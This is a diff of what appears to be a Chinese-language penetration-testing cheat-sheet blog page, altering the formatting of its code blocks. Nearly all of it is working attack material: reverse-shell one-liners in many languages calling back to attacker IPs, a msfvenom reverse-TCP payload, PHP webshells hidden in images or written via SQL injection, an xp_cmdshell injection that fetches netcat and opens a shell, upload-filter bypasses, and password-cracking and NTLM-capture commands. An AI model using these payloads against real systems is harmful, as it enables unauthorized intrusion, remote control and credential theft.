-<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
-<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
-<h3 id="Netcat-without-e"><a href="#Netcat-without-e" class="headerlink" title="Netcat without -e"></a>Netcat without -e</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1</span></span><br><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2</span></span><br><span class="line">nc localhost 443 | /bin/sh | nc localhost 444</span><br></pre></td></tr></table></figure>
-<h3 id="Telnet-Linux"><a href="#Telnet-Linux" class="headerlink" title="Telnet(Linux)"></a>Telnet(Linux)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet localhost 443 | /bin/sh | telnet localhost 444</span><br></pre></td></tr></table></figure>
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();</span><br></pre></td></tr></table></figure>
-<h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br></pre></td></tr></table></figure>
-<h3 id="非交互式shell升级"><a href="#非交互式shell升级" class="headerlink" title="非交互式shell升级"></a>非交互式shell升级</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">/bin/busybox sh</span><br></pre></td></tr></table></figure>
+# Windows TCP Ports
+snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3
+
+# Software Name
+snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2
+
+# brute-force community strings
+onesixtyone -i snmp-ips.txt -c community.txt
+
+snmp-check $TARGET
+</code></pre>
+<h3 id="SMTP探测"><a href="#SMTP探测" class="headerlink" title="SMTP探测"></a>SMTP探测</h3><pre><code class="shell">smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
+</code></pre>
+<h3 id="域信息探测"><a href="#域信息探测" class="headerlink" title="域信息探测"></a>域信息探测</h3><pre><code class="shell"># current domain info
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# domain trusts
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
+# current forest info
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+
+# get forest trust relationships
+([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()
+
+# get DCs of a domain
+nltest /dclist:offense.local
+net group &quot;domain controllers&quot; /domain
+
+# get DC for currently authenticated session
+nltest /dsgetdc:offense.local
+
+# get domain trusts from cmd shell
+nltest /domain_trusts
+
+# get user info
+nltest /user:&quot;spotless&quot;
+
+# get DC for currently authenticated session
+set l
+
+# get domain name and DC the user authenticated to
+klist
+
+# get all logon sessions. Includes NTLM authenticated sessions
+klist sessions
+
+# kerberos tickets for the session
+klist
+
+# cached krbtgt
+klist tgt
+
+# whoami on older Windows systems
+set u
+
+# find DFS shares with ADModule
+Get-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name
+
+# find DFS shares with ADSI
+$s=[adsisearcher]&#39;(name=*)&#39;; $s.SearchRoot = [adsi]&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;; $s.FindAll() | % &#123;$_.properties.name&#125;
+
+# check if spooler service is running on a host
+powershell ls &quot;\\dc01\pipe\spoolss&quot;
+</code></pre>
+<h3 id="Powershell下的端口监听"><a href="#Powershell下的端口监听" class="headerlink" title="Powershell下的端口监听"></a>Powershell下的端口监听</h3><pre><code class="powershell"># Start listener on port 443
+$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
+ 
+while($true)
+&#123;
+    $client = $listener.AcceptTcpClient();
+    Write-Host $client.client.RemoteEndPoint &quot;connected!&quot;;
+    $client.Close();
+    start-sleep -seconds 1;
+&#125;
+</code></pre>
+<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><pre><code class="shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+</code></pre>
+<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><pre><code class="shell">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
+
+#URL-Encoded Perl: Linux
+echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew
+</code></pre>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre><code class="shell">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+</code></pre>
+<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre><code class="shell">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
+</code></pre>
+<h3 id="Netcat-without-e"><a href="#Netcat-without-e" class="headerlink" title="Netcat without -e"></a>Netcat without -e</h3><pre><code class="shell">#1
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f
+
+#2
+nc localhost 443 | /bin/sh | nc localhost 444
+</code></pre>
+<h3 id="Telnet-Linux"><a href="#Telnet-Linux" class="headerlink" title="Telnet(Linux)"></a>Telnet(Linux)</h3><pre><code class="shell">telnet localhost 443 | /bin/sh | telnet localhost 444
+</code></pre>
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre><code class="shell">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();
+</code></pre>
+<h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><pre><code class="shell">xterm -display 10.0.0.1:1
+</code></pre>
+<h3 id="非交互式shell升级"><a href="#非交互式shell升级" class="headerlink" title="非交互式shell升级"></a>非交互式shell升级</h3><pre><code class="shell">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;
+/bin/busybox sh
+</code></pre>
 <p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p>
-<h2 id="JDWP-RCE"><a href="#JDWP-RCE" class="headerlink" title="JDWP RCE"></a>JDWP RCE</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())</span><br></pre></td></tr></table></figure>
+<h2 id="JDWP-RCE"><a href="#JDWP-RCE" class="headerlink" title="JDWP RCE"></a>JDWP RCE</h2><pre><code class="shell">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())
+</code></pre>
 <p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p>
-<h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><h3 id="msf生成有效载荷"><a href="#msf生成有效载荷" class="headerlink" title="msf生成有效载荷"></a>msf生成有效载荷</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai</span><br></pre></td></tr></table></figure>
-<h3 id="Linux下编译c代码"><a href="#Linux下编译c代码" class="headerlink" title="Linux下编译c代码"></a>Linux下编译c代码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows</span></span><br><span class="line">i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux</span></span><br><span class="line">gcc -m32|-m64 -o output source.c</span><br></pre></td></tr></table></figure>
-<h3 id="Windows下编译为-obj"><a href="#Windows下编译为-obj" class="headerlink" title="Windows下编译为.obj"></a>Windows下编译为.obj</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D</span></span><br><span class="line">nasm -f win64 .\hello.asm -o .\hello.obj</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://www.godevtool.com/Golink.zip</span></span><br><span class="line">GoLink.exe -o .\hello.exe .\hello.obj</span><br></pre></td></tr></table></figure>
-<h3 id="py文件转换exe"><a href="#py文件转换exe" class="headerlink" title="py文件转换exe"></a>py文件转换exe</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller.py --onefile convert-to-exe.py</span><br></pre></td></tr></table></figure>
-<h3 id="生成有效载荷模式并计算偏移量"><a href="#生成有效载荷模式并计算偏移量" class="headerlink" title="生成有效载荷模式并计算偏移量"></a>生成有效载荷模式并计算偏移量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE</span><br></pre></td></tr></table></figure>
+<h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><h3 id="msf生成有效载荷"><a href="#msf生成有效载荷" class="headerlink" title="msf生成有效载荷"></a>msf生成有效载荷</h3><pre><code class="shell">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai
+</code></pre>
+<h3 id="Linux下编译c代码"><a href="#Linux下编译c代码" class="headerlink" title="Linux下编译c代码"></a>Linux下编译c代码</h3><pre><code class="shell"># Windows
+i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
+# Linux
+gcc -m32|-m64 -o output source.c
+</code></pre>
+<h3 id="Windows下编译为-obj"><a href="#Windows下编译为-obj" class="headerlink" title="Windows下编译为.obj"></a>Windows下编译为.obj</h3><pre><code class="shell"># https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
+nasm -f win64 .\hello.asm -o .\hello.obj
 
-<h2 id="WEB文件上传"><a href="#WEB文件上传" class="headerlink" title="WEB文件上传"></a>WEB文件上传</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file.php -&gt; file.jpg</span><br><span class="line">file.php -&gt; file.php.jpg</span><br><span class="line">file.asp -&gt; file.asp;.jpg</span><br><span class="line">file.gif (contains php code, but starts with string GIF/GIF98)</span><br><span class="line">00%</span><br><span class="line">file.jpg with php backdoor in exif (see below)</span><br><span class="line">.jpg -&gt; proxy intercept -&gt; rename to .php</span><br></pre></td></tr></table></figure>
-
+# http://www.godevtool.com/Golink.zip
+GoLink.exe -o .\hello.exe .\hello.obj
+</code></pre>
+<h3 id="py文件转换exe"><a href="#py文件转换exe" class="headerlink" title="py文件转换exe"></a>py文件转换exe</h3><pre><code class="shell">python pyinstaller.py --onefile convert-to-exe.py
+</code></pre>
+<h3 id="生成有效载荷模式并计算偏移量"><a href="#生成有效载荷模式并计算偏移量" class="headerlink" title="生成有效载荷模式并计算偏移量"></a>生成有效载荷模式并计算偏移量</h3><pre><code class="shell">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
+</code></pre>
+<h2 id="WEB文件上传"><a href="#WEB文件上传" class="headerlink" title="WEB文件上传"></a>WEB文件上传</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>file.php -&gt; file.jpg
+file.php -&gt; file.php.jpg
+file.asp -&gt; file.asp;.jpg
+file.gif (contains php code, but starts with string GIF/GIF98)
+00%
+file.jpg with php backdoor in exif (see below)
+.jpg -&gt; proxy intercept -&gt; rename to .php
+</code></pre>
 <h3 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h3><p>图片文件后门语句注入</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exiv2 -c&#x27;A &quot;&lt;?php system($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;!&#x27; backdoor.jpeg</span><br><span class="line">exiftool “-comment&lt;=back.php” back.png</span><br></pre></td></tr></table></figure>
-<h3 id="htaccess文件配置"><a href="#htaccess文件配置" class="headerlink" title=".htaccess文件配置"></a>.htaccess文件配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传.htaccess文件将.blah文件解析为.php文件</span></span><br><span class="line">AddType application/x-httpd-php .blah</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">exiv2 -c&#39;A &quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;!&#39; backdoor.jpeg
+exiftool “-comment&lt;=back.php” back.png
+</code></pre>
+<h3 id="htaccess文件配置"><a href="#htaccess文件配置" class="headerlink" title=".htaccess文件配置"></a>.htaccess文件配置</h3><pre><code class="shell">#上传.htaccess文件将.blah文件解析为.php文件
+AddType application/x-httpd-php .blah
+</code></pre>
 <h3 id="SQL注入上传WebShell"><a href="#SQL注入上传WebShell" class="headerlink" title="SQL注入上传WebShell"></a>SQL注入上传WebShell</h3><p>手工：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Assumed 3 columns</span><br><span class="line">http://target/index.php?vulnParam=0&#x27; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj</span><br></pre></td></tr></table></figure>
+<pre><code># Assumed 3 columns
+http://target/index.php?vulnParam=0&#39; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj
+</code></pre>
 <p>SQLMap</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sqlmap; post-request - captured request via Burp Proxy via Save Item to File.</span></span><br><span class="line">sqlmap -r post-request -p item --level=3 --risk=2 --dbms=mysql --os-shell --threads 10</span><br></pre></td></tr></table></figure>
+<pre><code class="shell"># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
+sqlmap -r post-request -p item --level=3 --risk=2 --dbms=mysql --os-shell --threads 10
+</code></pre>
 <p>NetCat(适用于xp_cmdshell可用的SQL Server)</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">netcat reverse shell via mssql injection when xp_cmdshell is available</span></span><br><span class="line">1000&#x27;;+exec+master.dbo.xp_cmdshell+&#x27;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&#x27;;--</span><br></pre></td></tr></table></figure>
+<pre><code class="shell"># netcat reverse shell via mssql injection when xp_cmdshell is available
+1000&#39;;+exec+master.dbo.xp_cmdshell+&#39;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&#39;;--
+</code></pre>
+<h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><h3 id="hydra破解Web服务密码"><a href="#hydra破解Web服务密码" class="headerlink" title="hydra破解Web服务密码"></a>hydra破解Web服务密码</h3><pre><code class="shell">hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list
+</code></pre>
+<h3 id="hydra破解通用协议口令"><a href="#hydra破解通用协议口令" class="headerlink" title="hydra破解通用协议口令"></a>hydra破解通用协议口令</h3><pre><code class="shell">hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
+</code></pre>
+<h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><pre><code class="shell"># Bruteforce based on the pattern;
+hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  
 
-<h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><h3 id="hydra破解Web服务密码"><a href="#hydra破解Web服务密码" class="headerlink" title="hydra破解Web服务密码"></a>hydra破解Web服务密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list</span><br></pre></td></tr></table></figure>
-<h3 id="hydra破解通用协议口令"><a href="#hydra破解通用协议口令" class="headerlink" title="hydra破解通用协议口令"></a>hydra破解通用协议口令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1</span><br></pre></td></tr></table></figure>
+# Generate password candidates: wordlist + pattern;
+hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
 
-<h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Bruteforce based on the pattern;</span></span><br><span class="line">hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Generate password candidates: wordlist + pattern;</span></span><br><span class="line">hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Generate NetNLTMv2 with internalMonologue and crack with hashcat</span></span><br><span class="line">InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">resulting <span class="built_in">hash</span></span></span><br><span class="line">spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">crack with hashcat</span></span><br><span class="line">hashcat -m5600 &#x27;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#x27; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable</span><br></pre></td></tr></table></figure>
-<h3 id="破解zip文件密码"><a href="#破解zip文件密码" class="headerlink" title="破解zip文件密码"></a>破解zip文件密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip</span><br></pre></td></tr></table></figure>
+# Generate NetNLTMv2 with internalMonologue and crack with hashcat
+InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
+# resulting hash
+spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
 
-<h2 id="本地信息挖掘"><a href="#本地信息挖掘" class="headerlink" title="本地信息挖掘"></a>本地信息挖掘</h2><h3 id="寻找可读-写文件夹"><a href="#寻找可读-写文件夹" class="headerlink" title="寻找可读&#x2F;写文件夹"></a>寻找可读&#x2F;写文件夹</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-ChildItem</span> <span class="string">&quot;c:\windows\&quot;</span> <span class="literal">-recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"><span class="variable">$a</span> | % &#123;</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$_</span>.fullname</span><br><span class="line">    <span class="variable">$acls</span> = <span class="built_in">get-acl</span> <span class="variable">$fileName</span>  <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">select</span> <span class="literal">-exp</span> access | ? &#123;<span class="variable">$_</span>.filesystemrights <span class="operator">-match</span> <span class="string">&quot;full|modify|write&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.identityreference <span class="operator">-match</span> <span class="string">&quot;authenticated users|everyone|<span class="variable">$env:username</span>&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$acls</span> <span class="operator">-ne</span> <span class="variable">$null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="type">pscustomobject</span>]<span class="selector-tag">@</span>&#123;</span><br><span class="line">            filename = <span class="variable">$fileName</span></span><br><span class="line">            user = <span class="variable">$acls</span> | <span class="built_in">select</span> <span class="literal">-exp</span> identityreference</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="检查是否已启用Powershell日志记录"><a href="#检查是否已启用Powershell日志记录" class="headerlink" title="检查是否已启用Powershell日志记录"></a>检查是否已启用Powershell日志记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</span><br></pre></td></tr></table></figure>
-<h3 id="检查WinEvent日志中是否有SecureString"><a href="#检查WinEvent日志中是否有SecureString" class="headerlink" title="检查WinEvent日志中是否有SecureString"></a>检查WinEvent日志中是否有SecureString</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;LogName=<span class="string">&#x27;Microsoft-Windows-PowerShell/Operational&#x27;</span>; ID=<span class="number">4104</span>&#125; | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> Message | <span class="built_in">Select-String</span> <span class="literal">-Pattern</span> <span class="string">&#x27;SecureString&#x27;</span></span><br></pre></td></tr></table></figure>
